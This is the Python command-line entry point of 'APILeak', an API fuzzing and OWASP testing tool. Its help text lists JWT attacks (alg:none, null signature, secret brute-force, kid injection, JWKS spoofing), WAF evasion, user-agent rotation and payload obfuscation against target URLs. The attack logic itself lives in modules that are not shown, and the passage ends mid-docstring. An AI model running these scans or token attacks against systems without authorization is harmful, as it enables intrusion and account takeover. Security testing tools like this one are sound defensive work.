#!/usr/bin/env python3
"""
APILeak Main Entry Point
Enterprise-grade API fuzzing and OWASP testing tool
"""

import asyncio
import sys
import json
import copy
from pathlib import Path
import click
import os

from core import APILeakCore, ConfigurationManager, setup_logging
from core.logging import get_logger
from utils.jwt_utils import decode_jwt, encode_jwt, print_jwt_info


def parse_response_codes(response_filter: str) -> list:
    """Parse response code filter string into list of integers"""
    if not response_filter:
        return []
    
    codes = []
    parts = response_filter.split(',')
    
    for part in parts:
        part = part.strip()
        if '-' in part:
            # Range like 200-300
            try:
                start, end = part.split('-')
                codes.extend(range(int(start), int(end) + 1))
            except ValueError:
                click.echo(f"Warning: Invalid range format '{part}', ignoring", err=True)
        else:
            # Single code like 200
            try:
                codes.append(int(part))
            except ValueError:
                click.echo(f"Warning: Invalid response code '{part}', ignoring", err=True)
    
    return sorted(list(set(codes)))  # Remove duplicates and sort


def parse_status_codes(status_filter: str) -> list:
    """Parse status code filter string into list of integers for HTTP output filtering"""
    if not status_filter:
        return []
    
    codes = []
    parts = status_filter.split(',')
    
    for part in parts:
        part = part.strip()
        if '-' in part:
            # Range like 200-300
            try:
                start, end = part.split('-')
                codes.extend(range(int(start), int(end) + 1))
            except ValueError:
                click.echo(f"Warning: Invalid status code range format '{part}', ignoring", err=True)
        else:
            # Single code like 200
            try:
                codes.append(int(part))
            except ValueError:
                click.echo(f"Warning: Invalid status code '{part}', ignoring", err=True)
    
    return sorted(list(set(codes)))  # Remove duplicates and sort


def validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file):
    """Validate that only one user agent option is specified"""
    options_count = sum([bool(user_agent_random), bool(user_agent_custom), bool(user_agent_file)])
    
    if options_count > 1:
        click.echo("Error: Only one user agent option can be specified at a time:", err=True)
        click.echo("  --user-agent-random", err=True)
        click.echo("  --user-agent-custom", err=True)
        click.echo("  --user-agent-file", err=True)
        sys.exit(1)
    
    # Validate user agent file exists if specified
    if user_agent_file:
        if not Path(user_agent_file).exists():
            click.echo(f"Error: User agent file not found: {user_agent_file}", err=True)
            sys.exit(1)


def load_user_agents_from_file(file_path):
    """Load user agents from file, filtering out empty lines and comments"""
    try:
        user_agents = []
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    user_agents.append(line)
        
        if not user_agents:
            click.echo(f"Error: No valid user agents found in file: {file_path}", err=True)
            sys.exit(1)
        
        return user_agents
    except Exception as e:
        click.echo(f"Error reading user agent file {file_path}: {e}", err=True)
        sys.exit(1)


def prepare_output_filename(output_param):
    """Prepare output filename, ensuring it goes to reports directory"""
    if not output_param:
        return None
    
    # Extract just the filename, ignore any path components
    filename = Path(output_param).name
    
    # Remove any extension as the system will add appropriate extensions
    if '.' in filename:
        filename = filename.rsplit('.', 1)[0]
    
    return filename


def print_banner():
    """Print APILeak banner"""
    banner = r"""
      .o.       ooooooooo.   ooooo ooooo                            oooo                 
     .888.      `888   `Y88. `888' `888'                            `888                 
    .8"888.      888   .d88'  888   888          .ooooo.   .oooo.    888  oooo   .oooo.o 
   .8' `888.     888ooo88P'   888   888         d88' `88b `P  )88b   888 .8P'   d88(  "8 
  .88ooo8888.    888          888   888         888ooo888  .oP"888   888888.    `"Y88b.  
 .8'     `888.   888          888   888       o 888    .o d8(  888   888 `88b.  o.  )88b 
o88o     o8888o o888o        o888o o888ooooood8 `Y8bod8P' `Y888""8o o888o o888o 8""888P' 

APILeak v0.1.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
"""
    click.echo(banner, color=True)


def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, ci_mode=False, fail_on="critical"):
    """Create an enhanced configuration with all advanced features integrated"""
    # Support environment variable overrides for CI/CD integration
    target_url = target_url or os.getenv('APILEAK_TARGET', '')
    
    default_wordlists = {
        'endpoints': 'wordlists/endpoints.txt',
        'parameters': 'wordlists/parameters.txt',
        'headers': 'wordlists/headers.txt',
        'jwt_secrets': 'wordlists/jwt_secrets.txt'
    }
    
    # Use provided wordlist or default
    if wordlist_path:
        if scan_type == "dir":
            default_wordlists['endpoints'] = wordlist_path
        elif scan_type == "par":
            default_wordlists['parameters'] = wordlist_path
    
    # Configure user agent settings with environment variable support
    user_agent_settings = {
        'User-Agent': os.getenv('APILEAK_USER_AGENT', 'APILeak/0.1.0'),
        'Accept': 'application/json'
    }
    random_user_agent = False
    user_agent_list = None
    user_agent_rotation = False
    
    if user_agent_config:
        if user_agent_config.get('random'):
            random_user_agent = True
        elif user_agent_config.get('custom'):
            user_agent_settings['User-Agent'] = user_agent_config['custom']
        elif user_agent_config.get('file_list'):
            user_agent_list = user_agent_config['file_list']
            user_agent_rotation = True
            # Use first user agent as default
            user_agent_settings['User-Agent'] = user_agent_list[0]
    
    # Configure enhanced advanced discovery settings
    advanced_discovery_config = {
        'enabled': True,  # Always enable for full integration
        'framework_detection': {
            'enabled': advanced_config.get('detect_framework', False) if advanced_config else False,
            'adapt_payloads': True,
            'test_framework_endpoints': True,
            'max_error_requests': 5,
            'timeout': 10.0,
            'confidence_threshold': advanced_config.get('framework_confidence', 0.6) if advanced_config else 0.6
        },
        'version_fuzzing': {
            'enabled': advanced_config.get('fuzz_versions', False) if advanced_config else False,
            'version_patterns': advanced_config.get('version_patterns', [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5",
                "/api/1", "/api/2", "/api/3",
                "/1", "/2", "/3"
            ]) if advanced_config else [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5"
            ],
            'test_endpoints': ["/", "/health", "/status", "/info", "/docs"],
            'max_concurrent_requests': 5,
            'timeout': 10.0,
            'compare_endpoints': True,
            'detect_deprecated': True
        },
        'subdomain_discovery': advanced_config.get('enable_subdomain_discovery', False) if advanced_config else False,
        'cors_analysis': advanced_config.get('enable_cors_analysis', False) if advanced_config else False,
        'security_headers': advanced_config.get('enable_cors_analysis', False) if advanced_config else False,
        'waf_detection': {
            'enabled': advanced_config.get('enable_waf_evasion', False) if advanced_config else False,
            'adaptive_throttling': True,
            'evasion_techniques': True
        },
        'payload_encoding': {
            'enabled': advanced_config.get('enable_payload_encoding', False) if advanced_config else False,
            'encodings': ['url', 'base64', 'html', 'unicode'],
            'obfuscation_techniques': ['case_variation', 'mutation']
        }
    }

    # Enhanced OWASP modules configuration
    owasp_modules = [] if scan_type in ["dir", "par"] else [
        module.strip() for module in os.getenv('APILEAK_MODULES', 'bola,auth,property,resource,function_auth,ssrf').split(',')
    ] if os.getenv('APILEAK_MODULES') else [
        "bola", "auth", "property", "resource", "function_auth", "ssrf"
    ]

    config = {
        'target': {
            'base_url': target_url,
            'default_method': 'GET',
            'timeout': int(os.getenv('APILEAK_TIMEOUT', '10')),
            'verify_ssl': os.getenv('APILEAK_VERIFY_SSL', 'true').lower() == 'true'
        },
        'fuzzing': {
            'endpoints': {
                'enabled': scan_type in ["full", "dir"],
                'wordlist': default_wordlists['endpoints'],
                'methods': ["GET", "POST", "PUT", "DELETE", "PATCH"],
                'follow_redirects': True
            },
            'parameters': {
                'enabled': scan_type in ["full", "par"],
                'query_wordlist': default_wordlists['parameters'],
                'body_wordlist': default_wordlists['parameters'],
                'boundary_testing': scan_type == "full"  # Enable for full scans
            },
            'headers': {
                'enabled': scan_type == "full",
                'wordlist': default_wordlists['headers'],
                'custom_headers': user_agent_settings,
                'random_user_agent': random_user_agent,
                'user_agent_list': user_agent_list,
                'user_agent_rotation': user_agent_rotation
            },
            'recursive': True,
            'max_depth': int(os.getenv('APILEAK_MAX_DEPTH', '3')),
            'response_filter': []
        },
        'owasp_testing': {
            'enabled_modules': owasp_modules
        },
        'authentication': {
            'contexts': [
                {
                    'name': 'anonymous',
                    'type': 'bearer',
                    'token': os.getenv('APILEAK_JWT_TOKEN', ''),
                    'privilege_level': 0
                }
            ],
            'default_context': 'anonymous'
        },
        'rate_limiting': {
            'requests_per_second': int(os.getenv('APILEAK_RATE_LIMIT', '10')),
            'burst_size': 20,
            'adaptive': True,
            'respect_retry_after': True,
            'backoff_factor': 2.0
        },
        'reporting': {
            'formats': ['json', 'html', 'txt'],
            'output_dir': os.getenv('APILEAK_OUTPUT_DIR', 'reports'),
            'output_filename': output_filename,
            'include_screenshots': False,
            'template_dir': 'templates'
        },
        'advanced_discovery': advanced_discovery_config,
        'http_output': {
            'status_code_filter': status_code_filter
        },
        'ci_cd_integration': {
            'enabled': ci_mode,
            'fail_on_severity': fail_on,
            'generate_artifacts': ci_mode,
            'exit_codes': {
                'critical': 2,
                'high': 1,
                'medium': 0,
                'low': 0
            }
        }
    }
    
    # For parameter fuzzing, disable endpoint discovery and use the target directly
    if scan_type == "par":
        config['fuzzing']['endpoints']['enabled'] = False
    
    return config


def create_default_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None):
    """Create a default configuration when no config file is provided (legacy compatibility)"""
    return create_enhanced_config(target_url, wordlist_path, scan_type, user_agent_config, output_filename, advanced_config, status_code_filter, False, "critical")
    """Create a default configuration when no config file is provided"""
    # Support environment variable overrides for CI/CD integration
    target_url = target_url or os.getenv('APILEAK_TARGET', '')
    
    default_wordlists = {
        'endpoints': 'wordlists/endpoints.txt',
        'parameters': 'wordlists/parameters.txt',
        'headers': 'wordlists/headers.txt',
        'jwt_secrets': 'wordlists/jwt_secrets.txt'
    }
    
    # Use provided wordlist or default
    if wordlist_path:
        if scan_type == "dir":
            default_wordlists['endpoints'] = wordlist_path
        elif scan_type == "par":
            default_wordlists['parameters'] = wordlist_path
    
    # Configure user agent settings with environment variable support
    user_agent_settings = {
        'User-Agent': os.getenv('APILEAK_USER_AGENT', 'APILeak/0.1.0'),
        'Accept': 'application/json'
    }
    random_user_agent = False
    user_agent_list = None
    user_agent_rotation = False
    
    if user_agent_config:
        if user_agent_config.get('random'):
            random_user_agent = True
        elif user_agent_config.get('custom'):
            user_agent_settings['User-Agent'] = user_agent_config['custom']
        elif user_agent_config.get('file_list'):
            user_agent_list = user_agent_config['file_list']
            user_agent_rotation = True
            # Use first user agent as default
            user_agent_settings['User-Agent'] = user_agent_list[0]
    
    # Configure advanced discovery settings
    advanced_discovery_config = {
        'framework_detection': {
            'enabled': advanced_config.get('detect_framework', False) if advanced_config else False,
            'adapt_payloads': True,
            'test_framework_endpoints': True,
            'max_error_requests': 5,
            'timeout': 10.0,
            'confidence_threshold': advanced_config.get('framework_confidence', 0.6) if advanced_config else 0.6
        },
        'version_fuzzing': {
            'enabled': advanced_config.get('fuzz_versions', False) if advanced_config else False,
            'version_patterns': advanced_config.get('version_patterns', [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5",
                "/api/1", "/api/2", "/api/3",
                "/1", "/2", "/3"
            ]) if advanced_config else [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5"
            ],
            'test_endpoints': ["/", "/health", "/status", "/info", "/docs"],
            'max_concurrent_requests': 5,
            'timeout': 10.0,
            'compare_endpoints': True,
            'detect_deprecated': True
        },
        'subdomain_discovery': {
            'enabled': False  # Keep disabled by default for performance
        },
        'cors_analysis': {
            'enabled': False  # Keep disabled by default for performance
        },
        'security_headers': {
            'enabled': False  # Keep disabled by default for performance
        }
    }

    config = {
        'target': {
            'base_url': target_url,
            'default_method': 'GET',
            'timeout': int(os.getenv('APILEAK_TIMEOUT', '10')),
            'verify_ssl': os.getenv('APILEAK_VERIFY_SSL', 'true').lower() == 'true'
        },
        'fuzzing': {
            'endpoints': {
                'enabled': scan_type in ["full", "dir"],
                'wordlist': default_wordlists['endpoints'],
                'methods': ["GET", "POST", "PUT", "DELETE", "PATCH"],
                'follow_redirects': True
            },
            'parameters': {
                'enabled': scan_type in ["full", "par"],
                'query_wordlist': default_wordlists['parameters'],
                'body_wordlist': default_wordlists['parameters'],
                'boundary_testing': False  # Disabled by default to avoid excessive requests
            },
            'headers': {
                'enabled': scan_type == "full",
                'wordlist': default_wordlists['headers'],
                'custom_headers': user_agent_settings,
                'random_user_agent': random_user_agent,
                'user_agent_list': user_agent_list,
                'user_agent_rotation': user_agent_rotation
            },
            'recursive': True,
            'max_depth': int(os.getenv('APILEAK_MAX_DEPTH', '3')),
            'response_filter': []
        },
        'owasp_testing': {
            'enabled_modules': [] if scan_type in ["dir", "par"] else [
                module.strip() for module in os.getenv('APILEAK_MODULES', 'bola,auth,property,resource,function_auth,ssrf').split(',')
            ] if os.getenv('APILEAK_MODULES') else [
                "bola", "auth", "property", "resource", "function_auth", "ssrf"
            ]
        },
        'authentication': {
            'contexts': [
                {
                    'name': 'anonymous',
                    'type': 'bearer',
                    'token': os.getenv('APILEAK_JWT_TOKEN', ''),
                    'privilege_level': 0
                }
            ],
            'default_context': 'anonymous'
        },
        'rate_limiting': {
            'requests_per_second': int(os.getenv('APILEAK_RATE_LIMIT', '10')),
            'burst_size': 20,
            'adaptive': True,
            'respect_retry_after': True,
            'backoff_factor': 2.0
        },
        'reporting': {
            'formats': ['json', 'html', 'txt'],
            'output_dir': os.getenv('APILEAK_OUTPUT_DIR', 'reports'),
            'output_filename': output_filename,
            'include_screenshots': False,
            'template_dir': 'templates'
        },
        'advanced_discovery': advanced_discovery_config,
        'http_output': {
            'status_code_filter': status_code_filter  # Filter for HTTP output display
        }
    }
    
    # For parameter fuzzing, disable endpoint discovery and use the target directly
    if scan_type == "par":
        config['fuzzing']['endpoints']['enabled'] = False
    
    return config


@click.group()
@click.option('--no-banner', is_flag=True, help='Suppress banner output')
@click.pass_context
def cli(ctx, no_banner):
    """APILeak v0.1.0 - Enterprise API Fuzzing Tool
    
    \b
    Performs comprehensive security testing of APIs including:
    • Traditional endpoint and parameter fuzzing
    • OWASP API Security Top 10 testing  
    • Advanced vulnerability detection with framework detection
    • Version fuzzing and subdomain discovery
    • WAF detection and evasion techniques
    • Advanced payload encoding and obfuscation
    • CORS analysis and security headers testing
    • Multi-format reporting with CI/CD integration
    • JWT token manipulation and analysis
    
    \b
    Basic Commands:
      python apileaks.py dir --target URL              # Directory fuzzing
      python apileaks.py par --target URL              # Parameter fuzzing  
      python apileaks.py full --target URL             # Full security scan
    
    \b
    Advanced Examples:
      python apileaks.py full --target URL --enable-advanced
      python apileaks.py full --target URL --detect-framework --fuzz-versions
      python apileaks.py full --target URL --user-agent-random --enable-waf-evasion
    
    \b
    CI/CD Integration:
      python apileaks.py full --target URL --ci-mode --fail-on critical
    
    \b
    JWT Utilities:
      python apileaks.py jwt decode TOKEN
      python apileaks.py jwt encode '{"sub":"user"}' --secret key
    """
    ctx.ensure_object(dict)
    ctx.obj['no_banner'] = no_banner
    
    # Print banner unless suppressed or showing help
    if not no_banner and ctx.info_name != 'help':
        print_banner()


@cli.command()
@click.option('--target', '-t', required=True, help='Target URL to scan')
@click.option('--wordlist', '-w', help='Wordlist file for directory fuzzing')
@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.option('--methods', default='GET,POST,PUT,DELETE,PATCH', 
              help='HTTP methods to test (comma-separated)')
@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
@click.option('--jwt', help='JWT token to use for authentication')
@click.option('--response', help='Filter by response codes (e.g., 200,301,404 or 200-300)')
@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during directory fuzzing')
@click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing during directory discovery')
@click.pass_context
def dir(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limit, methods, user_agent_random, user_agent_custom, user_agent_file, jwt, response, status_code, detect_framework, fuzz_versions):
    """Directory/endpoint fuzzing - discover hidden endpoints and directories
    
    \b
    Examples:
      python apileaks.py dir --target https://api.example.com
      python apileaks.py dir --target URL --wordlist custom.txt --rate-limit 5
      python apileaks.py dir --target URL --user-agent-random --detect-framework
    """
    
    # Validate user agent options
    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
    
    # Setup logging
    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
    logger = get_logger("dir")
    
    logger.info("APILeak directory fuzzing starting", version="0.1.0", target=target)
    
    try:
        # Prepare user agent configuration
        user_agent_config = None
        if user_agent_random:
            user_agent_config = {'random': True}
        elif user_agent_custom:
            user_agent_config = {'custom': user_agent_custom}
        elif user_agent_file:
            user_agents = load_user_agents_from_file(user_agent_file)
            user_agent_config = {'file_list': user_agents}
        
        # Prepare output filename
        output_filename = prepare_output_filename(output)
        
        # Prepare advanced configuration for directory fuzzing
        advanced_config = {
            'detect_framework': detect_framework,
            'fuzz_versions': fuzz_versions,
            'framework_confidence': 0.6  # Default confidence for dir mode
        }
        
        # Parse status code filter for HTTP output
        status_code_filter = parse_status_codes(status_code) if status_code else None
        
        # Create default configuration for directory fuzzing
        config_dict = create_default_config(target, wordlist, "dir", user_agent_config, output_filename, advanced_config, status_code_filter)
        
        # Apply CLI overrides
        if rate_limit:
            config_dict['rate_limiting']['requests_per_second'] = rate_limit
        if methods:
            config_dict['fuzzing']['endpoints']['methods'] = [m.strip() for m in methods.split(',')]
        if jwt:
            config_dict['authentication']['contexts'][0]['token'] = jwt
            config_dict['authentication']['contexts'][0]['type'] = 'bearer'
        if response:
            config_dict['fuzzing']['response_filter'] = parse_response_codes(response)
        
        # Load configuration through ConfigurationManager
        config_manager = ConfigurationManager()
        apileak_config = config_manager.load_config_from_dict(config_dict)
        
        # Validate configuration
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            logger.error("Configuration validation failed", errors=validation_errors)
            for error in validation_errors:
                click.echo(f"Error: {error}", err=True)
            sys.exit(1)
        
        # Run the scan
        asyncio.run(run_enhanced_apileak(apileak_config))
        
    except Exception as e:
        logger.error("Directory fuzzing failed", error=str(e))
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cli.command()
@click.option('--target', '-t', required=True, help='Target URL to scan')
@click.option('--wordlist', '-w', help='Wordlist file for parameter fuzzing')
@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.option('--methods', default='GET,POST', 
              help='HTTP methods to test (comma-separated)')
@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
@click.option('--jwt', help='JWT token to use for authentication')
@click.option('--response', help='Filter by response codes (e.g., 200,301,404 or 200-300)')
@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during parameter fuzzing')
@click.pass_context
def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limit, methods, user_agent_random, user_agent_custom, user_agent_file, jwt, response, status_code, detect_framework):
    """Parameter fuzzing - discover hidden parameters in API endpoints
    
    \b
    Examples:
      python apileaks.py par --target https://api.example.com/users/123
      python apileaks.py par --target URL --jwt TOKEN --wordlist params.txt
      python apileaks.py par --target URL --user-agent-random --rate-limit 3
    """
    
    # Validate user agent options
    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
    
    # Setup logging
    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
    logger = get_logger("par")
    
    logger.info("APILeak parameter fuzzing starting", version="0.1.0", target=target)
    
    try:
        # Prepare user agent configuration
        user_agent_config = None
        if user_agent_random:
            user_agent_config = {'random': True}
        elif user_agent_custom:
            user_agent_config = {'custom': user_agent_custom}
        elif user_agent_file:
            user_agents = load_user_agents_from_file(user_agent_file)
            user_agent_config = {'file_list': user_agents}
        
        # Prepare output filename
        output_filename = prepare_output_filename(output)
        
        # Prepare advanced configuration for parameter fuzzing
        advanced_config = {
            'detect_framework': detect_framework,
            'fuzz_versions': False,  # Version fuzzing not typically useful for parameter mode
            'framework_confidence': 0.6  # Default confidence for par mode
        }
        
        # Parse status code filter for HTTP output
        status_code_filter = parse_status_codes(status_code) if status_code else None
        
        # Create default configuration for parameter fuzzing
        config_dict = create_default_config(target, wordlist, "par", user_agent_config, output_filename, advanced_config, status_code_filter)
        
        # Apply CLI overrides
        if rate_limit:
            config_dict['rate_limiting']['requests_per_second'] = rate_limit
        if jwt:
            config_dict['authentication']['contexts'][0]['token'] = jwt
            config_dict['authentication']['contexts'][0]['type'] = 'bearer'
        if response:
            config_dict['fuzzing']['response_filter'] = parse_response_codes(response)
        # Note: methods parameter is not used for parameter fuzzing as it's handled differently
        
        # Load configuration through ConfigurationManager
        config_manager = ConfigurationManager()
        apileak_config = config_manager.load_config_from_dict(config_dict)
        
        # Validate configuration
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            logger.error("Configuration validation failed", errors=validation_errors)
            for error in validation_errors:
                click.echo(f"Error: {error}", err=True)
            sys.exit(1)
        
        # Run the scan
        asyncio.run(run_enhanced_apileak(apileak_config))
        
    except Exception as e:
        logger.error("Parameter fuzzing failed", error=str(e))
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cli.command()
@click.option('--config', '-c', type=click.Path(exists=True), 
              help='Configuration file path (YAML or JSON) - optional')
@click.option('--target', '-t', help='Target URL to scan (overrides config)')
@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--modules', help='Comma-separated list of OWASP modules to enable')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
@click.option('--jwt', help='JWT token to use for authentication')
@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection (FastAPI, Express, Django, Flask, etc.)')
@click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing (/v1, /v2, /api/v1, etc.)')
@click.option('--framework-confidence', type=float, default=0.6, help='Minimum confidence threshold for framework detection (0.0-1.0)')
@click.option('--version-patterns', help='Custom version patterns for fuzzing (comma-separated, e.g., /v1,/v2,/api/v1)')
@click.option('--enable-advanced', is_flag=True, help='Enable all advanced features (framework detection, version fuzzing, subdomain discovery, CORS analysis)')
@click.option('--enable-payload-encoding', is_flag=True, help='Enable advanced payload encoding and obfuscation techniques')
@click.option('--enable-waf-evasion', is_flag=True, help='Enable WAF detection and evasion techniques')
@click.option('--enable-subdomain-discovery', is_flag=True, help='Enable subdomain discovery and testing')
@click.option('--enable-cors-analysis', is_flag=True, help='Enable CORS policy analysis and security headers testing')
@click.option('--ci-mode', is_flag=True, help='Enable CI/CD mode with appropriate exit codes and artifact generation')
@click.option('--fail-on', type=click.Choice(['critical', 'high', 'medium', 'low']), 
              default='critical', help='Fail CI pipeline on findings of this severity or higher')
@click.pass_context
def full(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit, user_agent_random, user_agent_custom, user_agent_file, jwt, status_code, detect_framework, fuzz_versions, framework_confidence, version_patterns, enable_advanced, enable_payload_encoding, enable_waf_evasion, enable_subdomain_discovery, enable_cors_analysis, ci_mode, fail_on):
    """Full comprehensive scan - includes fuzzing and OWASP testing
    
    \b
    Examples:
      python apileaks.py full --target https://api.example.com
      python apileaks.py full --config config.yaml --target URL
      python apileaks.py full --target URL --modules bola,auth,property
      python apileaks.py full --target URL --enable-advanced --jwt TOKEN
      python apileaks.py full --target URL --ci-mode --fail-on critical
    """
    
    # Validate user agent options
    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
    
    # Setup logging
    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
    logger = get_logger("full")
    
    logger.info("APILeak full scan starting", version="0.1.0", ci_mode=ci_mode)
    
    try:
        config_manager = ConfigurationManager()
        
        if config:
            # Load configuration from file
            apileak_config = config_manager.load_config(config)
        else:
            # Create default configuration for full scan
            if not target:
                click.echo("Error: --target is required when no config file is provided", err=True)
                sys.exit(1)
            
            # Prepare user agent configuration
            user_agent_config = None
            if user_agent_random:
                user_agent_config = {'random': True}
            elif user_agent_custom:
                user_agent_config = {'custom': user_agent_custom}
            elif user_agent_file:
                user_agents = load_user_agents_from_file(user_agent_file)
                user_agent_config = {'file_list': user_agents}
            
            # Prepare output filename
            output_filename = prepare_output_filename(output)
            
            # Prepare advanced configuration with enhanced options
            advanced_config = {
                'detect_framework': detect_framework or enable_advanced,
                'fuzz_versions': fuzz_versions or enable_advanced,
                'framework_confidence': framework_confidence,
                'enable_payload_encoding': enable_payload_encoding or enable_advanced,
                'enable_waf_evasion': enable_waf_evasion or enable_advanced,
                'enable_subdomain_discovery': enable_subdomain_discovery or enable_advanced,
                'enable_cors_analysis': enable_cors_analysis or enable_advanced
            }
            
            # Parse custom version patterns if provided
            if version_patterns:
                custom_patterns = [p.strip() for p in version_patterns.split(',')]
                advanced_config['version_patterns'] = custom_patterns
            
            # Parse status code filter for HTTP output
            status_code_filter = parse_status_codes(status_code) if status_code else None
            
            config_dict = create_enhanced_config(target, None, "full", user_agent_config, output_filename, advanced_config, status_code_filter, ci_mode, fail_on)
            apileak_config = config_manager.load_config_from_dict(config_dict)
        
        # Apply CLI overrides
        cli_overrides = {}
        if target:
            cli_overrides['target_url'] = target
        if rate_limit:
            cli_overrides['rate_limit'] = rate_limit
        if modules:
            cli_overrides['modules'] = [m.strip() for m in modules.split(',')]
        if jwt:
            cli_overrides['jwt_token'] = jwt
        
        if cli_overrides:
            config_manager.merge_cli_overrides(cli_overrides)
        
        # Validate configuration
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            logger.error("Configuration validation failed", errors=validation_errors)
            for error in validation_errors:
                click.echo(f"Error: {error}", err=True)
            sys.exit(1)
        
        # Run the enhanced scan
        asyncio.run(run_enhanced_apileak(apileak_config, ci_mode, fail_on))
        
    except Exception as e:
        logger.error("Full scan failed", error=str(e))
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


# JWT Command Group
@cli.group()
@click.pass_context
def jwt(ctx):
    """JWT utilities - decode, encode, and security vulnerability testing
    
    \b
    JWT Security Testing includes:
    • Token decoding and analysis
    • Custom token generation
    • Algorithm confusion attacks (alg:none, null signature)
    • Weak HMAC secret brute-force
    • Key ID (kid) injection attacks
    • JWKS spoofing and inline injection
    • Comprehensive attack testing against live endpoints
    • Blank password signature acceptance
    
    \b
    Basic Examples:
      python apileaks.py jwt decode TOKEN
      python apileaks.py jwt encode '{"sub":"user"}' --secret key
      python apileaks.py jwt test-alg-none TOKEN
      python apileaks.py jwt brute-secret TOKEN --wordlist secrets.txt
    
    \b
    Comprehensive Attack Testing:
      python apileaks.py jwt attack-test TOKEN --url https://api.example.com/protected
      python apileaks.py jwt attack-test TOKEN -u URL -H "X-API-Key: key123"
      python apileaks.py jwt attack-test TOKEN -u URL -d '{"action":"read"}'
    
    \b
    Available Commands:
      decode              Decode and analyze JWT tokens
      encode              Create JWT tokens with custom payloads
      test-alg-none       Test algorithm confusion (alg:none) attacks
      test-null-signature Test null signature bypass attacks
      brute-secret        Brute-force weak HMAC secrets
      test-kid-injection  Test Key ID (kid) injection vulnerabilities
      test-jwks-spoof     Test JWKS URL spoofing attacks
      test-inline-jwks    Test inline JWKS injection attacks
      attack-test         Comprehensive automated attack testing (NEW)
    
    Use 'python apileaks.py jwt COMMAND --help' for detailed help on any command.
    """
    pass


@jwt.command('decode')
@click.argument('token')
@click.pass_context
def jwt_decode_cmd(ctx, token):
    """Decode and analyze a JWT token
    
    \b
    Example:
      python apileaks.py jwt decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
    """
    try:
        decoded = decode_jwt(token)
        print_jwt_info(decoded)
        
        # Also output as JSON for programmatic use
        click.echo("\n📄 JSON Output:")
        click.echo("-" * 20)
        click.echo(json.dumps({
            'header': decoded['header'],
            'payload': decoded['payload'],
            'signature': decoded['signature']
        }, indent=2))
        
    except ValueError as e:
        click.echo(f"❌ Error decoding JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('encode')
@click.argument('payload')
@click.option('--header', default='{"alg":"HS256","typ":"JWT"}', help='JWT header as JSON string')
@click.option('--secret', default='secret', help='Secret key for signing (default: "secret")')
@click.pass_context
def jwt_encode_cmd(ctx, payload, header, secret):
    """Encode a JWT token with custom payload and header
    
    \b
    Examples:
      python apileaks.py jwt encode '{"sub":"user123","role":"user"}'
